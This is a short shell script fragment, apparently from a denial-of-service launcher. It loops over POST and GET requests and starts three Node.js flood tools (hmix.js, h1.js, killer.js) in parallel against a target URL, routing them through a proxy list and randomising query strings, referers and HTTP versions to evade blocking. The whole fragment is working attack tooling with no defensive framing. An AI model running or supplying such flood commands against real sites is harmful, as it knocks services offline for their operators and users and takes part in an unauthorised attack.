...
for m in POST GET; do
  node hmix.js -m $m -u $URL -s $TIME -p live.txt -r -t 5 1 --full true -d false &
  node h1.js $m $URL live.txt $TIME 999 10 randomstring=true &
  node killer.js $m $URL $TIME 5 1 live.txt --query 1 --referer rand --http mix --close --parsed --reset &
done
